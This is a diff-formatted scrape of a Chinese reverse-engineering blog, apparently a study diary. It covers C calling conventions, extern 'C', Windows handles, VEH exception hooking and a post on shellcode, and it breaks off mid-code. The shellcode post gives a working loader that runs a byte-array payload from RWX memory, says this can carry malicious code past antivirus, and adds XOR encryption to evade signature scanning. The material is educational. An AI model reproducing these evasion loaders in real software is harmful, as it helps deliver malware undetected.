+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649861619368.png" alt="数组在栈中的存储"></p>
+<h1 id="0x04-函数声明"><a href="#0x04-函数声明" class="headerlink" title="0x04-函数声明"></a>0x04-函数声明</h1><p>返回值+函数名+参数</p>
+<pre class="language-c" data-language="c"><code class="language-c">//函数声明
+int sum(int,int);
+
+int sum(int a,int b)
+{
+	return a+b;
+}</code></pre>
+
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649862553289.png" alt="原因"></p>
+<h1 id="0x05-调用约定"><a href="#0x05-调用约定" class="headerlink" title="0x05-调用约定"></a>0x05-调用约定</h1><p>为什么要有不同的调用约定——是因为调用函数之后需要清理栈，而不同的调用约定对应不同的清理方式</p>
+<blockquote>
+<p>__cdecl：调用者自己清理栈</p>
+<pre class="language-c" data-language="c"><code class="language-c">//函数外部
+call hello;函数
+add esp,立即数</code></pre>
+
+<p>__stdcall：函数自己清理栈</p>
+<pre class="language-c" data-language="c"><code class="language-c">//函数内部
+retn 立即数</code></pre>
 
 
+</blockquote>
+<p>如果使用__cdcel调用方式，因为不同编译器产生的栈不同，所以不能很好地清理栈，而stdcall则可以在函数内部完成清理栈。</p>
+<blockquote>
+<p> <strong>所以，在跨（开发）平台的调用中，我们都使用stdcall（有时是以WINAPI的样子出现）。那么为什么还需要_cdecl呢？当我们遇到这样的函数如fprintf()它的参数是可变的，不定长的，被调用者事先无法知道参数的长度，事后的清除工作也无法正常的进行，因此，这种情况我们只能使用cdecl</strong> </p>
+</blockquote>
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898026998.png"></p>
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898651751.png"></p>
+<h1 id="0x06-extern-“C”"><a href="#0x06-extern-“C”" class="headerlink" title="0x06-extern “C”"></a>0x06-extern “C”</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898161708.png"></p>
+<p>也就是说如果不声明为extern “C”，我们导出的函数名会被修饰</p>
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898480365.png" alt="DLL代码"></p>
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898496934.png" alt="导出的函数名称"></p>
+<p>可以看到我们的函数名被修饰了，在调用的时候我们无法通过GetProcAddress通过函数名调用</p>
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898566926.png" alt="代码"></p>
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898581787.png" alt="导出的函数名称"></p>
+<p>可以看到我们的函数名没有被修饰</p>
+<blockquote>
+<p><strong>C++函数重载即函数名可以相等，只要该函数的参数类型或者个数不同即可</strong></p>
+</blockquote>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>标准文件头</p>
+<pre class="language-c" data-language="c"><code class="language-c">#ifndef __INCvxWorksh  /*防止该头文件被重复引用*/
+#define __INCvxWorksh
 
-    <a href="mailto:2973414642@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
+#ifdef __cplusplus    //__cplusplus是cpp中自定义的一个宏
+extern "C" {          //告诉编译器，这部分代码按C语言的格式进行编译，而不是C++的
+#endif
+
+    /**** some declaration or so *****/  
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif /* __INCvxWorksh */</code></pre>
+
+<blockquote>
+<p> extern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用 </p>
+</blockquote>
+<h1 id="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"><a href="#0x07-HMOUDLE、HANDLE、HWND、HINSTANCE" class="headerlink" title="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"></a>0x07-HMOUDLE、HANDLE、HWND、HINSTANCE</h1><p>这里就不看定义了，越看越晕（</p>
+<h2 id="HWND"><a href="#HWND" class="headerlink" title="HWND"></a>HWND</h2><p>HWND是线程相关的，可以通过HWND找到该窗口所属进程的句柄</p>
+<h2 id="HANDLE"><a href="#HANDLE" class="headerlink" title="HANDLE"></a>HANDLE</h2><p>Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄</p>
+<blockquote>
+<p><strong>系统对内核对象以链表的形式进行管理，载入到内存中的内核对象都有一个线性地址，同时相对系统来说，在串列中有一个索引位置，这个索引位置就是内核对象的HANDLE</strong></p>
+</blockquote>
+<h2 id="HINSTANCE"><a href="#HINSTANCE" class="headerlink" title="HINSTANCE"></a>HINSTANCE</h2><p>HINSTANCE的本质是模块基地址，它仅在同一进程中才有意义，跨进程的HINSTANCE是没有意义的</p>
+<h2 id="HMODULE"><a href="#HMODULE" class="headerlink" title="HMODULE"></a>HMODULE</h2><blockquote>
+<p><strong>代表应用程序载入的模块，WIN32系统下通常是被载入模块的线性地址，比如exe, dll等模块等</strong></p>
+</blockquote>
+<blockquote>
+<p> HINSTANCE 在win32下与HMODULE是相同的东西(只有在16位windows上，二者有所不同) </p>
+</blockquote>
+<h1 id="0x08-命令行参数"><a href="#0x08-命令行参数" class="headerlink" title="0x08-命令行参数"></a>0x08-命令行参数</h1><p>我们知道main函数实际上是有两个参数的，但一般不会进行使用</p>
+<p>其原型如下</p>
+<pre class="language-c" data-language="c"><code class="language-c">main(int argc,char*argv[])</code></pre>
+
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008765976.png"></p>
+<p>这两个参数实际上与命令行相关</p>
+<pre class="language-c" data-language="c"><code class="language-c">//argc是一个整数，其代表了命令行参数个数
+//argv是一个指针数组，可以接收多个参数，第一个也就是argv[0]指向输入的程序路径及名称
+//如果在命令行中运行，argc为1，也就是只有一个参数</code></pre>
+
+<p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008701868.png"></p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+int main(int argc,char *argv[])
+{
+	printf("命令行参数个数为：%d\n", argc);
+	for (int i = 0; i &lt; argc; ++i)
+	{
+		printf("第%d个命令行参数为：%s\n", i, argv[i]);
+	}
+	return 0;
+}</code></pre>
 
 
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2973414642" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2973414642" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-</div>
+      
     </div>
-</footer>
 
-<div class="progress-bar"></div>
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/10/VEH/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/10/VEH/" class="post-title-link" itemprop="url">VEH</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-10 17:23:53" itemprop="dateCreated datePublished" datetime="2022-04-10T17:23:53+08:00">2022-04-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-11 11:07:09" itemprop="dateModified" datetime="2022-04-11T11:07:09+08:00">2022-04-11</time>
+    </span>
+
+  
+</div>
+
         </div>
-        <div id="searchResult"></div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-VEH"><a href="#0x00-VEH" class="headerlink" title="0x00-VEH"></a>0x00-VEH</h1><p>VEH的中文名字为：向量化异常处理 （Vectored Exception Handling） ，是为操作系统提供的异常处理机制，类似于SEH，VEH的优先级高于SEH</p>
+<p> <img src="/2022/04/10/VEH/592902_92wf161s7cgif01.png" alt="应用层异常处理结构图"> </p>
+<h1 id="0x01-VEH回调函数详解"><a href="#0x01-VEH回调函数详解" class="headerlink" title="0x01-VEH回调函数详解"></a>0x01-VEH回调函数详解</h1><blockquote>
+<p>VEH由AddVectorExceptionHandler添加处理函数，处理函数有一个参数</p>
+<p>参数类型为PEXCEPTION_POINTERS结构体</p>
+<p>结构PEXCEPTION_POINTERS保存着当前异常的各个寄存器，堆栈，地址等多种信息</p>
+</blockquote>
+<p> <img src="/2022/04/10/VEH/592902_cvh37cwxtybvmyq.png" alt="pEXCEPTION_POINTER"> </p>
+<h1 id="0x02-VEH-Hook原理"><a href="#0x02-VEH-Hook原理" class="headerlink" title="0x02-VEH Hook原理"></a>0x02-VEH Hook原理</h1><blockquote>
+<p>1、异常处理结构中，VEH是唯一一个可以接收到所有异常信息的处理。换句话说：所有的异常信息都会经过VEH</p>
+<p>2、异常信息通常是由数组越界、内存访问出错、无效参数、int 3等造成的</p>
+<p>3、一旦发生异常，操作系统会立即遍历VEH，如果有处理函数，中断线程，并由处理函数处理</p>
+</blockquote>
+<p>思路</p>
+<p>如果我们要Hook消息框，首先要给API的首地址写入int 3断点，当执行时会产生异常，线程暂停，转交给异常处理函数处理，此时我们可以在处理函数中修改堆栈参数等</p>
+<p>相应操作完成后将int 3(0xCC)修改回源代码 修改EIP=addr(异常地址)，然后让此处的代码重新执行一次正确的代码</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;
+#include&lt;stdio.h&gt;
+#pragma data_seg("ldata")
+
+char trapcode[] = "*";
+unsigned long long llcode = 204;//CC 00 00 00INT3
+#pragma data_seg()
+#pragma comment(linker,"/SECTION:ldata,RWE")
+void Decshellcode()
+{
+
+	llcode = 0xF333333333333333;
+	llcode &lt;&lt;= 2;
+	char* data = (char*)&amp;llcode;
+	/*
+	* 解密shellcode 并且执行
+	* len 解密后的指令长度
+	* data 把解密后的指令写入data
+	* 比如 push ebp 就向data写入0x55
+	* 每次解密一条指令 不要用超过7字节的指令和跳转指令
+	*/
+	MessageBoxA(0, "不要再打辣", "停下", MB_OK);
+	return ;
+}
+long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val)
+{
+	//判断是否为int3断点
+	if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)
+	{
+		Decshellcode();//执行shellcode
+		//修改EIP
+		val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;
+		//表示成功处理，让程序继续执行
+		return EXCEPTION_CONTINUE_EXECUTION;
+	}
+	//继续往下搜索异常处理函数
+	else
+		return EXCEPTION_CONTINUE_SEARCH;
+}
+
+#pragma optimize("",off)
+int main()
+{
+	//创建VEH，当第一个参数不为0，则异常处理函数是第一个要调用的处理程序。如果参数为0，则处理程序是要调用的最后一个处理程序
+	//第二个参数是一个异常处理函数
+	AddVectoredExceptionHandler(1, ExceptionHandle);
+	int bilibili = 2020;
+	int arr[2] = { 1,2 };
+	int ti = 23;
+	arr[5] = (int)&amp;llcode;
+	return 0;
+}
+#pragma optimize("",on)</code></pre>
+
+<p><img src="/2022/04/10/VEH/1649639633494.png"></p>
+<p>这里修改EIP为我们的Print()函数，因为函数名表示的就是函数地址，所以就是让他执行我们的Print函数</p>
+<h1 id="0x03-VEH实现隐藏函数调用"><a href="#0x03-VEH实现隐藏函数调用" class="headerlink" title="0x03-VEH实现隐藏函数调用"></a>0x03-VEH实现隐藏函数调用</h1><p>我们知道函数调用时，会先把call的地址压入栈中，而在函数内部的返回ret指令就是从栈中取出call指令的下一条地址</p>
+<p>所以我们可以对栈中的地址进行修改让其调用我们的函数</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;
+#include&lt;stdio.h&gt;
+
+void showflag()
+{
+	MessageBoxA(0, "this is flag", "flag", MB_OK);
+	return ;
+}
+
+long _stdcall ExceptionHandler(PEXCEPTION_POINTERS val)
+{
+	//将EIP也就是下一条执行的指令修改为ret
+	val-&gt;ContextRecord-&gt;Eip += 6;
+	//降低栈顶
+	val-&gt;ContextRecord-&gt;Esp -= 4;
+	//入栈,将ret下一条指令压入栈中
+	*(int*)val-&gt;ContextRecord-&gt;Esp = val-&gt;ContextRecord-&gt;Eip + 1;
+	//和上面一样，这次修改为我们想要执行的地址
+	val-&gt;ContextRecord-&gt;Esp -= 4;
+	*(int*)val-&gt;ContextRecord-&gt;Esp=*(int*)(val-&gt;ContextRecord-&gt;Ebp-8);
+	return EXCEPTION_CONTINUE_EXECUTION;
+}
+int main()
+{
+	AddVectoredExceptionHandler(1, ExceptionHandler);
+	DWORD a = (DWORD)showflag;
+	int k = 0;
+	int c;
+	c=a / k;//构造除0异常
+	__asm
+	{
+		ret
+	}
+	printf("Get flag!!!");
+	return 0;
+}</code></pre>
+
+<p>具体的可以先看汇编</p>
+<p><img src="/2022/04/10/VEH/1649645606291.png"></p>
+<p>触发除零异常后，PEXCEPTION_POINTERS val会接收此时的信息</p>
+<p>我们先将EIP修改为ret指令，然后将ret下一条指令压入栈中，再把我们要调用的函数压入栈，这时候栈的结构为</p>
+<p><img src="/2022/04/10/VEH/1649645936725.png"></p>
+<p>返回值为EXCEPTION_CONTINUE_EXECUTION，表示继续往下执行，这时候EIP是ret指令，取出栈顶元素，跳转过去，执行完我们的shellcode后也存在ret，此时的栈为</p>
+<p><img src="/2022/04/10/VEH/1649646048618.png"></p>
+<p>shellcode尾部的ret取出栈顶的值，跳转过去，回到我们正常的程序</p>
+<blockquote>
+<p>修改EIP的时候也可以</p>
+<pre class="language-none"><code class="language-none">val-&gt;ContextRecord-&gt;Eip = (DWORD)val-&gt;ExceptionRecord-&gt;ExceptionAddress+6;</code></pre>
+
+<p>ExceptionRecord-&gt;ExceptionAddress是触发异常的地址</p>
+<p>ExceptionRecord-&gt;ExceptionCode表示异常的类型</p>
+</blockquote>
+<p>异常类型</p>
+<p><img src="/2022/04/10/VEH/1649646418174.png"></p>
+
+      
     </div>
-</div>
 
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
+    
+    
+    
 
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
 </div>
 
 
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
+
 
     
 
-    
 
-    <!-- 雪花特效 -->
-    
+<div class="post-block">
+  
+  
 
-    <!-- 鼠标星星特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
-            }
-        </script>
-    
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/">
 
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
 
-    <!-- Baidu Analytics -->
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
 
-    <!-- Baidu Push -->
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">shellcode知识</a>
+        </h2>
 
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
+      <time title="创建时间：2022-04-10 09:12:25" itemprop="dateCreated datePublished" datetime="2022-04-10T09:12:25+08:00">2022-04-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-14 15:28:03" itemprop="dateModified" datetime="2022-04-14T15:28:03+08:00">2022-04-14</time>
+    </span>
 
-    
+  
+</div>
 
-    
-
-    <!--腾讯兔小巢-->
-    
-    
+        </div>
+      </header>
 
     
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-Shellcode"><a href="#0x00-Shellcode" class="headerlink" title="0x00-Shellcode"></a>0x00-Shellcode</h1><p>什么是shellcode</p>
+<blockquote>
+<p> 在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码 </p>
+</blockquote>
+<h1 id="0x01-杀毒软件甄别病毒的技术原理"><a href="#0x01-杀毒软件甄别病毒的技术原理" class="headerlink" title="0x01-杀毒软件甄别病毒的技术原理"></a>0x01-杀毒软件甄别病毒的技术原理</h1><h2 id="基于特征进行甄别"><a href="#基于特征进行甄别" class="headerlink" title="基于特征进行甄别"></a>基于特征进行甄别</h2><p>主要是病毒以前留下的信息，基于这些信息，我们可以判断存在病毒。</p>
+<p>我们知道在PE文件中的.text段存放的是可执行代码，而杀毒软件会将其内容读取出来，并进行程序特征提取，判断可执行代码中是否存在病毒的特征，有的话就确定该程序存在病毒。</p>
+<p>这也就是为什么病毒还未运行就被发现的原因。</p>
+<h2 id="基于病毒的行为进行甄别"><a href="#基于病毒的行为进行甄别" class="headerlink" title="基于病毒的行为进行甄别"></a>基于病毒的行为进行甄别</h2><p>主要是针对病毒行为的敏感操作，当病毒想干坏事的时候，难免会调用API，当出现比较敏感的操作时，确定该程序为病毒。</p>
+<h1 id="0x03-一个简单的Loader"><a href="#0x03-一个简单的Loader" class="headerlink" title="0x03-一个简单的Loader"></a>0x03-一个简单的Loader</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
+#include&lt;stdio.h&gt;
+
+unsigned char  shellcode[] =
+"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
+"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
+"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
+"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
+"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
+"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
+"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
+"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
+int main()
+{
+	//分配内存，并设置为可读可写可执行，大小为shellcode的大小
+	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+	if (Memory == NULL)//当开辟失败时，直接结束
+	{
+		return 1;
+	}
+	//将shellcode复制到内存中
+	memcpy(Memory, shellcode, sizeof(shellcode));
+	/*DWORD dold;
+	VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*/
+
+	//强制转换为函数
+	((void(*)())Memory)();
+	return 0;
+}</code></pre>
+
+<p>运行时会直接弹出消息框</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649555515604.png"></p>
+<p>整个过程就是先开辟内存（注意要注意属性），然后将shellcode复制到内存中，再将我们复制的数据强制转换为函数并进行调用。这些行为和特征都是没有什么问题的，所以如果我们插入的是恶意代码，是可以绕过杀毒软件的。</p>
+<h1 id="0x04-优化Loader"><a href="#0x04-优化Loader" class="headerlink" title="0x04-优化Loader"></a>0x04-优化Loader</h1><h2 id="内存分配优化"><a href="#内存分配优化" class="headerlink" title="内存分配优化"></a>内存分配优化</h2><p>因为数据本身就占有内存，所以不需要重新进行分配，直接使用即可</p>
+<h2 id="改变属性"><a href="#改变属性" class="headerlink" title="改变属性"></a>改变属性</h2><p>因为数据存储于数据段中，而我们要让其可以执行，则需要改变其属性为可执行</p>
+<blockquote>
+<p>0xC000005报错表示内存访问的属性问题</p>
+</blockquote>
+<pre class="language-c" data-language="c"><code class="language-c">BOOL VirtualProtect(
+  [in]  LPVOID lpAddress,
+  [in]  SIZE_T dwSize,
+  [in]  DWORD  flNewProtect,
+  [out] PDWORD lpflOldProtect
+);</code></pre>
+
+<p>第一个参数是地址起始位置</p>
+<p>第二个参数是需要改变的内存大小</p>
+<p>第三个参数是想要改变的属性</p>
+<p>主要有</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/42dad68bad2c64271524c48a96f3822.png"></p>
+<p>第四个参数</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556346133.png"></p>
+<p>所以我们要让他指向有效变量，而不能是NULL</p>
+<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>不知道为什么使用这种方法在VS会报错-无法强制转换</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556539202.png"></p>
+<h1 id="0x05-更进一步"><a href="#0x05-更进一步" class="headerlink" title="0x05-更进一步"></a>0x05-更进一步</h1><p>因为上一步将内存的属性修改并执行，那么一定会审计我们的shellcode，如果shellcode存在恶意的行为，很快就会被辨别出来，所以我们要对其进行加密，使其无法被识别。当然要注意要进行解密操作。</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
+#include&lt;stdio.h&gt;
+#pragma data_seg("vdata")
+
+unsigned char  shellcode[] =
+"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
+"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
+"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
+"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
+"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
+"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
+"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
+"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
+#pragma data_seg()//创建段，名称为vdata
+#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性
+
+int main()
+{
+	//加密函数
+	for (int i = 0; i &lt; sizeof(shellcode); ++i)
+	{
+		shellcode[i] ^= 0x23;
+	}
+	//分配内存，并设置为可读可写可执行，大小为shellcode的大小
+	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+	if (Memory == NULL)//当开辟失败时，直接结束
+	{
+		return 1;
+	}
